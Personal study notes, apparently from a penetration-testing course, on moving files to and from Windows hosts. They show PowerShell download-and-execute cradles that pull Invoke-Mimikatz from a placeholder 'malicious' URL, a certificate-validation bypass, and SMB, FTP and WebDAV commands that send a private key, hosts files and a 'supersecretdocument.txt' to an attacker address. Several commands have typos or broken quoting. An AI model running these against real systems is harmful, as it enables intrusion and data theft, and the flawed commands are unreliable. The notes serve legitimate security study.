
### Powershell Base64 encode/decode
The size of the file in question will affect how we decide to attempt to transfer. if we have access to a terminal, we can encode a file to a base64 string, copy it form the terminal and perform the reverse operation in the target. if using this method, it is critical that you check the hash has not changed after operations. below is an example of going from the pwnbox to a windows box
```
n00blyfe@htb$ md5sum id_rsa
4e301756a07ded0a2dd6953abf015278 id_rsa

n00blyfe@htb$ cat id_rsa | base64 -w 0; echo
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=

### then we go to the windows machine and use the base64 string as shown

PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))

PS C:\htb> get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm     Hash                                Path 
---------     ----                                ---- 
MD5           4E301756A07DED0A2DD6953ABF015278    C:\Users\Public\id_rsa
```
this is convenient but is not always possible, cmd has a max string lengeth of 8191 characters, web shells may also fail if strings are too long.

### PowerShell Web Downloads
typically HTTP and HTTPS will be allowed through a firewall, though there may be web filtering, download filtering by file type etc. PowerShell gives us multiple file transfer options which utilize HTTP, HTTPS, and FTP. the table below lists some WebClient mothedos for downloading 

| Method              | Description                                                                                 |
| ------------------- | ------------------------------------------------------------------------------------------- |
| OpenRead            | Returns the data from a resource as a Stream                                                |
| OpenReadAsync       | Returns the data from a resource without blocking the calling thread                        |
| DownloadData        | Downloads data from a resource and returns a Byte array                                     |
| DownloadDataAsync   | Downloads data from a resource and returns a Byte array without blocking the calling thread |
| DownloadFile        | Downloads data from a resource to a local file                                              |
| DownloadFileAsync   | Downloads data from a resource to a local file without blocking the calling thread          |
| DownloadString      | Downloads a string from a resource and returns a string                                     |
| DownloadStringAsync | Downloads a String from a resource without blocking the calling thread.                     |
##### Powershell DownloadFile method
create a new object using the Net.webClient class and method Downloadfile (see below)
```
PS C:\htb> (new-object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/malicious/file.exe, C:\Users\Public\Downloads\file.exe`)

PS C:\htb> (new-object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/malicious/file.exe, C:\Users\Public\Downloads\file.exe`)
```
##### PowerShell DownloadString - Fileless method
fileless attacks work by using operating system functions to download the payload and execute it directly. we can do this in powershell with invoke expression (alias IEX) see below

```
PS C:\htb> IEX (New-object Net.WebClient).DownloadString('https://raw.githubusercontent.com/malicious/Invoke-mimikatz.ps1`) 

# IEX can also be pipelined
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/malicious/invoke-mimkatz.ps1') | IEX
```

##### PowerShell Invoke-WebRequest
starting at PowerShell 3.0 you can use invoke-webrequest, but it is notably slower at downloading files. aliases inculde `iwr`, `curl`, and `wget`
```
PS C:\htb> Invoke-WebRequest htts://raw.githubusercontent.com/malicious/PowerView.ps1
-outfile PowerView.ps1
```

get familiar with PowerShell means of downloading things, they all have their quirks you need to be aware of 
##### Common Errors with PowerShell 
if internet explorer first-launch config has not been completed, you can bypass it with the following flag `-UseBasicParsing`
Another Error is certificate trust issues, to bypass that error run (after error occurs)
```
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback: {$true}
```

### SMB Downloads
very common in enterprise networks. we can create an SMB server on our attacking machine with smbserver.py from impacket, then use `copy`, `move`, powershell `copy-item`, or any other tool that allows SMB Connection

##### Create an SMB server
```
n00blyfe@htb$ sudo impacket-smbserver share -smb2support /tmp/smbshare
```
##### Copy a File from the SMB Server
```
C:\htb> copy \\192.168.220.133\share\nc.exe
```
nowadays most windows setups will default to blocking unauthenticated guest access to SMB shares.
##### Create athe SMB Server with a Username and Password
```
n00blyfe@htb$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
then you can mount and download with the following
```
C:\htb> net use \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```
### FTP downloads
you can use either an FTP client or PowerShell Net.WebClient to download files from an FTP server.
setup an FTP server using Python3 `pyftpdlib` it can be installed as shown below
```
n00blyfe@htb$ sudo pip3 install pyftpdlib
```
 default setup allows anonymous access and uses port 2121 we can set it up with the following command
 ```
 n00blyfe@htb$ sudo python3 -m pyftpdlib --port 21
 ```
 you can then download the file either with an existing FTP client, or PowerShell `Net.WebClient`
 if you don't have an interactive shell, you may need to create a command file for the FTP client and download the target file use the following example
 ```
 C:\htb> echo open 1902.168.49.128 > ftpcommand.txt
 C:\htb> echo USER anonymous >> ftpcommand.txt
 C:\htb> echo binary >> ftpcommand.txt
 C:\htb> echo GET file.txt >> ftpcommand.txt
 C:\htb> echo bye >> ftpcommand.txt
 C:\htb> ftp -v -n -s:ftpcommand.txt
 ftp> open 192.168.49.128
 Log in with USER and PASS first.
 ftp> USER anonymous
 
 ftp> GET file.txt
 ftp> bye
 
 C:\htb> more file.txt
 This is a test file
 ```

### Upload Operations
we can use the same methods we used for download operations but now for uploads. Lets see how we can accomplish this.

### Powershell Base64 Encode & Decode
same as downloading just in reverse
```
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\dirvers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=

PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select hash

Hash
----
3688374325B992DEF12793500307566D

### copy and paste the base 64 then decode and check hash

n00blyfe@htb$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts

n00blyfe@htb$ md5sum hosts

3688374325b992def12793500307566d hosts


```

### PowerShell Web Uploads
there isn't a built-in function for this but we can use invoke-webRequest or invoke-restmethod to build our own upload function. we'll also need a web server that accepts uploads which is not a default in most webserver utilities. We will use upload server, an extended module of the python HTTP.server module, below is how to install and configure
```
n00blyfe@htb$ pip3 install uploadserver

n00blyfe@htb$ python3 -m uploadserver
```
now we use a PowerShell script to upload the file using `Invoke-RestMethod` to perform the upload operations.

##### PowerShell Base64 Web Upload
we can also use invoke-webrequest or invoke-restmethod with netcat (on attack machine) see below:
```
PS C:\htb> $b64 = [System.convert]:: ToBase64String((get-content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
$S C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8080/ -Method POST -Body $b64

### beforehand set up listener on attack machine as below

n00blyfe@htb$ nc -lvnp 8080

listening on [any] 8000 ... 
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923 
POST / HTTP/1.1 
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682 
Content-Type: application/x-www-form-urlencoded 
Host: 192.168.49.128:8000 
Content-Length: 1820 
Connection: Keep-Alive 

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo

n00blyfe@htb$ echo <base64> | base64 -d -w 0 > hosts
```

### SMB Uploads
while typically you can connect outbound via SMB, we can run SMB over HTTP with `WebDav`. `WebDav` enables a webserver to behave like a file server can use HTTP or HTTPS. when you use SMB it will attempt to connoct with SMB, if no SMB share is availabel it will try with HTTP

##### WebDav Server
need `wsgidav` and `cheroot` (install with python)
```
n00blyfe@htb4 sudo pip3 install wsgidav cheroot

### setup/deploy

n00blyfe@htb$ sudo swgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

##### Connecting to the Webdav Share
now we connect using the `DavWWWRoot` directory
```
C:\htb> dir \\192.168.49.128\DavWWWRoot

```
note that `DavWWWRoot` is a special windows keyword. it says that you are connecting to the root of the WebDAV server.

then you can just upload files with the copy command
```
C:\htb> copy C:\Users\john\Desktop\supersecretdocument.txt \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\supersecretdocument.txt \\192.168.49.129\sharefolder\
```

### FTP Uploads
this is nearly identical to downloads you just need to specify the --write flag, see below
```
n00blyfe@htb$ sudo python3 -m pyftpdlib --port 21 --write
```
and again we can upload with PowerShell or an FTP client see below
```
###Powershell
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

###FTP client
C:\htb> echo open 192.168.49.128 > ftpcommand.txt 
C:\htb> echo USER anonymous >> ftpcommand.txt 
C:\htb> echo binary >> ftpcommand.txt 
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt 
C:\htb> echo bye >> ftpcommand.txt 
C:\htb> ftp -v -n -s:ftpcommand.txt 
ftp> open 192.168.49.128 

Log in with USER and PASS first. 

ftp> USER anonymous 
ftp> PUT c:\windows\system32\drivers\etc\hosts 
ftp> bye

```